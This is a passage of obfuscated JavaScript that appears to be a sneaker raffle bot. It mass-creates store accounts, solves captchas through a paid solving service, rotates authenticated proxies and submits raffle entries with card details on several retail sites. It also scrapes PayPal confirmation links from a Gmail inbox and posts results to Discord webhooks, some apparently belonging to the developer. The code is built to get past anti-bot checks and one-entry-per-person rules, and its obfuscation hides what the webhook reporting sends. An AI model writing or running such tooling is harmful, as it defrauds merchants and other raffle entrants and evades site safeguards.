                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x505c33 = await _0x1c16b2['newPage']();
            await _0x505c33['authenticate']({
                'username': '' + _0x18df00[0x2],
                'password': '' + _0x18df00[0x3]
            }), console['log'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x505c33['setRequestInterception'](!![]), _0x505c33['on']('request', _0xcdb582 => {
                _0xcdb582['resourceType']() === 'image' || _0xcdb582['resourceType']() === 'font' || _0xcdb582['resourceType']() === 'media' ? _0xcdb582['abort']() : _0xcdb582['continue']();
            }), await _0x505c33['goto'](_0x433486), await _0x63444f(0xbb8), await _0x505c33['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Filling\x20information'), await _0x505c33['type']('#RegisterForm-FirstName', '' + bouncewear[_0x3af7c0]['FirstName']), await _0x63444f(0x226), await _0x505c33['type']('#RegisterForm-LastName', '' + bouncewear[_0x3af7c0]['LastName']), await _0x63444f(0x226), await _0x505c33['type']('#RegisterForm-email', '' + bouncewear[_0x3af7c0]['Email']), await _0x63444f(0x226), await _0x505c33['type']('#RegisterForm-password', '' + bouncewear[_0x3af7c0]['Password']), await _0x63444f(0x226), await _0x505c33['click']('#marketing'), console['log'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Submitting..'), await _0x505c33['$eval']('#RegisterForm', _0x50dc44 => _0x50dc44['submit']()), await _0x63444f(0x1f40), console['log'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x505c33['solveRecaptchas'](), await _0x505c33['click']('.shopify-challenge__button.btn');
            async function _0x1dfc01() {
                for (var _0xf6fae = 0x0; _0xf6fae < 0x4; _0xf6fae++) {
                    try {
                        console['log']('try'), await _0x505c33['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20' + _0x580fd6['red']('Catpcha\x20failed,\x20retrying..')), await _0x505c33['solveRecaptchas'](), await _0x505c33['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x1dfc01(), console['log'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x63444f(0x1f4);
            try {
                await _0x505c33['waitForSelector']('.featured-title'), await _0x63444f(0x1f4), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3af7c0]['Email'] + '\x20Generated!')), _0x442555['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x3af7c0]['Email'] + ',' + bouncewear[_0x3af7c0]['Password']), console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x4bfc92['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3af7c0]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x2e3677) {
                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2e3677));
            }
        } catch (_0xe19db3) {
            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x3af7c0 + 0x1) + '\x20:\x20' + _0xe19db3));
        } finally {
            _0x1c16b2 && _0x1c16b2['close'](), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
        }
    }
}
async function _0x39795a(_0x27390c, _0x21decc, _0x3717ed) {
    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xb4964b['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1cbf1b = 0x0; _0x1cbf1b < _0x21decc['length']; _0x1cbf1b++) {
        _0x40199d(_0x27390c['name'] + '\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20/\x20' + _0x21decc['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
        var _0x3f21e6 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1a887b
                },
                {
                    'name': 'Product',
                    'value': '' + _0x21decc[_0x1cbf1b]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x21decc[_0x1cbf1b]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xb4964b['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0xb4964b['version']
                }
            ]
        }];
        const _0x59552f = { 'embeds': _0x3f21e6 };
        await _0x1713f8(_0x21decc, _0x1cbf1b);
        if (_0x21decc[_0x1cbf1b]['Email'] == '' || _0x21decc[_0x1cbf1b]['Password'] == '' || _0x21decc[_0x1cbf1b]['FirstName'] == '' || _0x21decc[_0x1cbf1b]['LastName'] == '') {
            console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x21decc[_0x1cbf1b]['Password'] == '' || _0x21decc[_0x1cbf1b]['Password'] == undefined) && (_0x21decc[_0x1cbf1b]['Password'] = 'ErehsaWonRaj1!');
        if (_0xb4964b['useRandomProxy'] = ![])
            var _0x4e7d1a = _0x3717ed[_0x1cbf1b]['split'](':');
        else
            var _0x2176a9 = Math['round'](Math['random']() * (_0x3717ed['length'] - 0x1)), _0x4e7d1a = _0x3717ed[_0x2176a9]['split'](':');
        const _0x37d8d4 = await _0x5e99b4['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4e7d1a[0x0] + ':' + _0x4e7d1a[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5b85d2 = await _0x37d8d4['newPage']();
            await _0x5b85d2['authenticate']({
                'username': '' + _0x4e7d1a[0x2],
                'password': '' + _0x4e7d1a[0x3]
            }), console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b85d2['setRequestInterception'](!![]), _0x5b85d2['on']('request', _0x2d0ef4 => {
                _0x2d0ef4['resourceType']() === 'image' || _0x2d0ef4['resourceType']() === 'font' || _0x2d0ef4['resourceType']() === 'media' ? _0x2d0ef4['abort']() : _0x2d0ef4['continue']();
            }), await _0x5b85d2['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x5b85d2['goto']('' + _0x21decc[_0x1cbf1b]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x5b85d2['waitForSelector']('#btnPdpAtb'), console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x21decc[_0x1cbf1b]['Size']);
            const _0x517ba5 = await _0x5b85d2['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x53f1fe => {
                return _0x53f1fe['map'](_0x427ece => _0x427ece['innerText']);
            }), _0x2dd483 = await _0x5b85d2['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x3a797a = ![];
            if (_0x21decc[_0x1cbf1b]['Size'] == 'RANDOM') {
                var _0x33848d = Math['round'](Math['random']() * (_0x2dd483['length'] - 0x1));
                await _0x2dd483[_0x33848d]['click']();
            } else
                for (var _0x12a6d4 = 0x0; _0x12a6d4 < _0x517ba5['length']; _0x12a6d4++) {
                    if (_0x517ba5[_0x12a6d4] != _0x21decc[_0x1cbf1b]['Size'])
                        continue;
                    try {
                        await _0x2dd483[_0x12a6d4]['click']();
                    } catch {
                        console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x3a797a = !![];
                    }
                }
            if (_0x3a797a)
                continue;
            await _0x63444f(0x578), await _0x5b85d2['click']('#btnPdpAtb'), await _0x5b85d2['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x63444f(0x3e8), console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x5b85d2['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x5b85d2['waitForSelector']('#email'), await _0x5b85d2['type']('#email', _0x21decc[_0x1cbf1b]['Email']), await _0x63444f(0x226), await _0x5b85d2['click']('#guest-submit'), await _0x63444f(0x1b58), console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5b85d2['waitForSelector']('#firstname'), await _0x5b85d2['type']('#firstname', _0x21decc[_0x1cbf1b]['FirstName'], 0x1f4), await _0x63444f(0x190), await _0x5b85d2['waitForSelector']('#surname'), await _0x5b85d2['type']('#surname', _0x21decc[_0x1cbf1b]['LastName'], 0x1f4), await _0x63444f(0x190), await _0x5b85d2['waitForSelector']('#mobile'), await _0x5b85d2['type']('#mobile', _0x21decc[_0x1cbf1b]['Phone'], 0x1f4), await _0x63444f(0x190), await _0x5b85d2['click']('#enterManualDiv'), await _0x63444f(0x5dc), await _0x5b85d2['waitForSelector']('#address1'), await _0x5b85d2['type']('#address1', _0x21decc[_0x1cbf1b]['Address1'] + '\x20' + _0x21decc[_0x1cbf1b]['HouseNumber'], 0x226), await _0x63444f(0x384), await _0x5b85d2['waitForSelector']('#address2'), await _0x5b85d2['type']('#address2', '' + _0x21decc[_0x1cbf1b]['Address2'], 0x226), await _0x63444f(0x320);
            const _0x472318 = await _0x5b85d2['$$eval']('#countryselect_view3\x20>\x20option', _0x4ed180 => {
                return _0x4ed180['map'](_0x4435dc => _0x4435dc['value']);
            });
            var _0x384a2f;
            for (var _0x55cb62 = 0x0; _0x55cb62 < _0x472318['length']; _0x55cb62++) {
                if (_0x472318[_0x55cb62]['startsWith']('' + _0x21decc[_0x1cbf1b]['Country'])) {
                    _0x384a2f = _0x472318[_0x55cb62];
                    break;
                }
                continue;
            }
            await _0x5b85d2['select']('#countryselect_view3', '' + _0x384a2f), await _0x5b85d2['waitForSelector']('#address4'), await _0x5b85d2['type']('#address4', '' + _0x21decc[_0x1cbf1b]['City'], 0x1f4), await _0x63444f(0x384), await _0x5b85d2['waitForSelector']('#postcode'), await _0x5b85d2['type']('#postcode', '' + _0x21decc[_0x1cbf1b]['Zip'], 0x1f4), await _0x63444f(0x4b0);
            const _0x101147 = await _0x5b85d2['url']();
            console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x5209c0 = _0x101147['split']('?')[0x1], _0xeb161d = await _0x5b85d2['$']('#co_address_submit');
            await _0xeb161d['evaluate'](_0x4dfad4 => _0x4dfad4['click']()), await _0x63444f(0x1388), await _0x5b85d2['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x5209c0), console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x5b85d2['waitForSelector']('#paymentbuttons'), await _0x63444f(0x1388), await _0x5b85d2['click']('#paymentbuttons\x20>\x20div'), await _0x63444f(0x1c2), await _0x5b85d2['waitForSelector']('#card-number'), await _0x5b85d2['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x4b65da = await _0x5b85d2['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x2a107b = await _0x4b65da['contentFrame']();
            await _0x2a107b['waitForSelector']('.InputContainer'), await _0x2a107b['click']('.InputContainer\x20>\x20input'), await _0x63444f(0x578), await _0x5b85d2['type']('#card-number', '' + _0x21decc[_0x1cbf1b]['CreditNumber']), await _0x63444f(0xfa), await _0x5b85d2['type']('#card-expiry', '' + _0x21decc[_0x1cbf1b]['ExpiryDate']), await _0x63444f(0xfa), await _0x5b85d2['type']('#card-cvc', '' + _0x21decc[_0x1cbf1b]['CVV']), await _0x63444f(0x7d0), await _0x5b85d2['click']('#card-button'), console['log'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x5b85d2['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x584f8b(_0xe17ea3, _0x59552f);
            } catch {
                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x203DS\x20Failed')), _0x3f21e6[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x3f21e6[0x0]['description'] = '3DS\x20Failed', await _0x584f8b(_0x437fba, _0x59552f);
            }
        } catch (_0x1f77a4) {
            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x27390c['name'] + ']\x20Task\x20' + (_0x1cbf1b + 0x1) + '\x20:\x20' + _0x1f77a4)), _0x3f21e6[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x3f21e6[0x0]['description'] = '' + _0x1f77a4, await _0x584f8b(_0x437fba, _0x59552f);
        } finally {
            _0x37d8d4 && _0x37d8d4['close']();
            if (_0x1cbf1b + 0x1 == _0x21decc['length']) {
                console['log'](_0x580fd6['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x63444f(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xb4964b['AfewDelay'] + '\x20ms'), await _0x63444f(_0xb4964b['AfewDelay']);
        }
    }
}
async function _0x216830(_0x46b195, _0x3090d6, _0x172662, _0x2a2dca, _0x3974c2) {
    var _0x1c32c6, _0x1c2cc6 = {}, _0xc7d1ed = [], _0x509a40 = {}, _0x202d8e = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x2a2dca && (_0x2a2dca = {});
    if (_0x3090d6 != 'ver') {
        _0x40199d(_0x172662['name'] + '\x20Task\x20' + (_0x46b195 + 0x1) + '\x20/\x20' + _0x2a2dca['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x2a2dca, _0x46b195), _0xc7d1ed = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1a887b
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2a2dca[_0x46b195]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xb4964b['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3b25e6
                }
            ]
        }], _0x509a40 = { 'embeds': _0xc7d1ed }, _0x1c2cc6 = _0x172662['data'];
        _0x3090d6 == 'exp' ? _0x1c2cc6['data']['attributes']['email'] = '' + _0x2a2dca[_0x46b195]['FirstName'] + _0x2a2dca[_0x46b195]['LastName'] + _0xb4964b['catchall'] : _0x1c2cc6['data']['attributes']['email'] = '' + _0x2a2dca[_0x46b195]['Email'];
        if (_0x2a2dca[_0x46b195]['Size'] == 'RANDOM') {
        }
        _0x1c2cc6['data']['attributes']['properties']['$first_name'] = '' + _0x2a2dca[_0x46b195]['FirstName'], _0x1c2cc6['data']['attributes']['properties']['$last_name'] = '' + _0x2a2dca[_0x46b195]['LastName'], _0x1c2cc6['data']['attributes']['properties']['$address1'] = _0x2a2dca[_0x46b195]['Address1'] + '\x20' + _0x2a2dca[_0x46b195]['Address2'] + '\x20' + _0x2a2dca[_0x46b195]['HouseNumber'], _0x1c2cc6['data']['attributes']['properties']['$zip'] = '' + _0x2a2dca[_0x46b195]['Zip'], _0x1c2cc6['data']['attributes']['properties']['$city'] = '' + _0x2a2dca[_0x46b195]['City'], _0x1c2cc6['data']['attributes']['properties']['$country'] = '' + _0x2a2dca[_0x46b195]['Country'], _0x1c2cc6['data']['attributes']['properties']['Size'] = '' + _0x2a2dca[_0x46b195]['Size'], _0x1c2cc6['data']['attributes']['properties']['$phone_number'] = '' + _0x2a2dca[_0x46b195]['Phone'], _0x1c2cc6['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2a2dca[_0x46b195]['Follower'];
    }
    if (_0xb4964b['useRandomProxy'] = ![])
        var _0x3999cf = _0x3974c2[_0x46b195]['split'](':');
    else
        var _0x3f9e1a = Math['round'](Math['random']() * (_0x3974c2['length'] - 0x1)), _0x3999cf = _0x3974c2[_0x3f9e1a]['split'](':');
    var _0x204d56 = {
        'jar': _0x3aae82,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x172662['url'],
        'headers': _0x172662['headers'],
        'body': JSON['stringify'](_0x1c2cc6),
        'proxy': 'http://' + _0x3999cf[0x2] + ':' + _0x3999cf[0x3] + '@' + _0x3999cf[0x0] + ':' + _0x3999cf[0x1]
    };
    return _0x3090d6 != 'ver' && (_0x204d56['url'] = _0x172662['url'], _0x204d56['headers'] = _0x172662['headers']), _0x3090d6 == 'ver' && (_0x204d56['method'] = 'GET'), new Promise(function (_0x51f51f, _0x63f794) {
        callback = async (_0x2e29d5, _0x4d5e5e, _0x30c306) => {
            if (!_0x2e29d5 && _0x4d5e5e['statusCode'] == 0xca || !_0x2e29d5 && _0x4d5e5e['statusCode'] == 0xc8) {
                if (_0x3090d6 != 'ver') {
                    var _0x4a7ba1 = await _0x4d9326(_0x2a2dca[_0x46b195], _0x172662, 'dev', ![]), _0x4a2e63 = await _0x4d9326(_0x2a2dca[_0x46b195], _0x172662, 'pub', ![]);
                    const _0x1e1d27 = {
                        'succesDEVMSG': { 'embeds': [_0x4a7ba1] },
                        'succesPUBMSG': { 'embeds': [_0x4a2e63] }
                    };
                    if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                        try {
                            await _0x584f8b(_0xb4964b['webhook'], _0x1e1d27['succesDEVMSG']);
                        } catch {
                        }
                    await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x1e1d27['succesDEVMSG']), await _0x63444f(0xc8);
                    try {
                        await _0x584f8b(_0x3501b6, _0x1e1d27['succesPUBMSG']);
                    } catch {
                    }
                    _0xa2d2c6(_0x2a2dca[_0x46b195], _0x172662);
                }
                _0x51f51f(console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x172662['name'] + ']\x20Task\x20' + (_0x46b195 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x3090d6 != 'ver') {
                    var _0x4e3804 = '' + _0x2e29d5, _0x285722 = await _0x4d9326(_0x2a2dca[_0x46b195], _0x172662, 'dev', !![], _0x4e3804), _0x430593 = {};
                    _0x430593['errorDEV'] = { 'embeds': [_0x285722] }, _0x1d0bc0(_0x2a2dca[_0x46b195], _0x172662), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x430593['errorDEV']), await _0x584f8b(_0x437fba, _0x430593['errorDEV']);
                }
                _0x63f794(console['log'](_0x46d913() + '\x20[' + _0x172662['name'] + ']\x20Task\x20' + (_0x46b195 + 0x1) + ':\x20' + _0x2e29d5));
            }
        };
        try {
            _0x3090d6 != 'ver' && console['log'](_0x46d913() + '\x20[' + _0x172662['name'] + ']\x20Task\x20' + (_0x46b195 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1c2cc6['data']['attributes']['email']), _0x15bdb0(_0x204d56, callback);
        } catch (_0x5d2d05) {
            console['log'](_0x46d913() + '\x20Task\x20' + (_0x46b195 + 0x1) + ':\x20' + _0x5d2d05);
        }
    });
}
;
async function _0x342050(_0x423e3d, _0x6aa969) {
    if (_0x119f41 != 'yes')
        var _0x119f41 = '', _0x58c0c6 = 0x0;
    var _0x2e271f = [];
    async function _0x3173a1() {
        console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify?');
        var _0x58b7b5 = await _0x27f157['get']('Quantity')['Quantity'], _0x54054c = new _0x2021ac({
            'user': _0xb4964b['masterMail'],
            'password': _0xb4964b['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x59028a(_0x3061ee) {
            _0x54054c['openBox']('INBOX', ![], _0x3061ee);
        }
        _0x54054c['once']('ready', function () {
            _0x59028a(function (_0x10fc0a, _0x5c9471) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x10fc0a)
                    throw _0x10fc0a;
                _0x54054c['seq']['search']([
                    'UNSEEN',
                    [
                        'FROM',
                        'noreply@afew-store.com'
                    ]
                ], function (_0x3f616c, _0x36dce8) {
                    if (!_0x36dce8 || !_0x36dce8['length'])
                        console['log'](_0x46d913() + '\x20[' + _0x423e3d['name'] + ']\x20No\x20mails\x20found'), _0x54054c['end']();
                    else {
                        var _0x224503 = _0x54054c['seq']['fetch'](_0x36dce8, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x224503['on']('message', function (_0x5164f6, _0x43e9de) {
                            var _0x527dd1 = '(#' + _0x43e9de + ')\x20';
                            _0x5164f6['on']('body', function (_0x31bceb, _0x3292e0) {
                                _0x22cc54(_0x31bceb, (_0x510fca, _0x1d77a8) => {
                                    if (_0x1d77a8['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x1d77a8['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x1d77a8['text']['split']('[')[0x2];
                                        var _0x4f8be7 = mes['split'](']')[0x0];
                                        _0x2e271f['push'](_0x4f8be7);
                                    }
                                });
                            }), _0x5164f6['once']('end', function () {
                            });
                        }), _0x224503['once']('error', function (_0xd16615) {
                            console['log']('Fetch\x20error:\x20' + _0xd16615);
                        }), _0x224503['once']('end', function () {
                            _0x54054c['end']();
                        });
                    }
                });
            });
        }), _0x54054c['once']('error', function (_0x3e49ec) {
            console['log'](_0x580fd6['red'](_0x3e49ec['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x54054c['once']('end', async function () {
        }), _0x54054c['connect']();
    }
    try {
        _0x3173a1(), await _0x63444f(0xfa0), console['log']('Found\x20' + _0x2e271f['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x63444f(0xfa0);
    }
    var _0x43aa9a;
    _0x40199d('' + _0x423e3d);
    var _0x4ff0cc = _0x6aa969[0x0]['split'](':');
    const _0x30aeee = await _0x5e99b4['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x4ff0cc[0x0] + ':' + _0x4ff0cc[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Getting\x20Session');
        const _0x15af78 = await _0x30aeee['newPage']();
        await _0x15af78['authenticate']({
            'username': '' + _0x4ff0cc[0x2],
            'password': '' + _0x4ff0cc[0x3]
        }), await _0x15af78['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x15af78, await _0x15af78['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x15af78['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Successfully\x20logged\x20in'), await _0x63444f(0x2710);
        } catch (_0x2e0ba5) {
            throw new Error('Login\x20session\x20expired\x20' + _0x2e0ba5);
        }
        for (var _0x346948 = 0x0; _0x346948 < _0x2e271f['length']; _0x346948++) {
            console['log'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Task\x20' + (_0x346948 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x40199d(_0x423e3d + '\x20Task\x20' + (_0x346948 + 0x1) + '\x20/\x20' + _0x2e271f['length']);
            const _0x4678b0 = await _0x30aeee['newPage']();
            await _0x4678b0['goto']('' + _0x2e271f[_0x346948], { 'waitUntil': 'networkidle2' }), await _0x63444f(0xbb8);
            try {
                const _0x13317a = await _0x4678b0['$']('#challenge-heading');
                _0x13317a && (console['log'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Task\x20' + (_0x346948 + 0x1) + '\x20:\x20' + _0x580fd6['yellow']('2FA\x20Required')), await _0x4678b0['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x63444f(0x9c40), await _0x4678b0['waitForSelector']('#payment-submit-btn'), await _0x4678b0['$eval']('#payment-submit-btn', _0x54a04c => _0x54a04c['click']()), await _0x4678b0['click']('#payment-submit-btn');
                try {
                    await _0x4678b0['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x63444f(0x5dc), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Task\x20' + (_0x346948 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x726dfc) {
                    _0x119f41 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x726dfc['message']);
                } finally {
                    if (_0x119f41 == 'yes' && _0x58c0c6 != 0x2) {
                        console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x423e3d['name'] + ']\x20Task\x20' + (_0x346948 + 0x1) + '\x20:\x20Retrying')), _0x346948 = _0x346948 - 0x1, _0x58c0c6 = _0x58c0c6 + 0x1;
                        continue;
                    }
                    _0x119f41 == 'yes' && _0x58c0c6 >= 0x2 && (_0x1d0bc0(csv[_0x346948], _0x423e3d), _0x119f41 = 'no', _0x58c0c6 = 0x0), await _0x4678b0['close'](), await _0x63444f(0x4650);
                }
            } catch (_0x277f70) {
                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x423e3d + ']\x20Task\x20' + (_0x346948 + 0x1) + '\x20:\x20' + _0x277f70));
            }
        }
    } catch (_0x11d005) {
        console['log'](_0x580fd6['red']('' + _0x11d005));
    } finally {
        return await _0x30aeee['close'](), menu();
    }
}
const _0x58a956 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x28b9f5, _0x330921, _0x2fd177) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2dfb1a = 0x0; _0x2dfb1a < _0x330921['length']; _0x2dfb1a++) {
                        if (_0x1ba657 != 'yes')
                            var _0x1ba657 = '', _0x122c9d = 0x0;
                        var _0x53c83a;
                        await _0x1713f8(_0x330921, _0x2dfb1a), _0x40199d(_0x28b9f5['name'] + '\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20/\x20' + _0x330921['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
                        var _0x494612 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x3abf9a = Math['round'](Math['random']() * (_0x494612['length'] - 0x1));
                        _0x330921[_0x2dfb1a]['Size'] == 'RANDOM' && (_0x330921[_0x2dfb1a]['Size'] = _0x494612[_0x3abf9a]);
                        var _0x52b38c = Math['round'](Math['random']() * (_0x2fd177['length'] - 0x1)), _0x22f7f0 = _0x2fd177[_0x52b38c]['split'](':'), _0x5b6225;
                        try {
                            _0x5b6225 = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x22f7f0[0x0] + ':' + _0x22f7f0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5b6225 = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
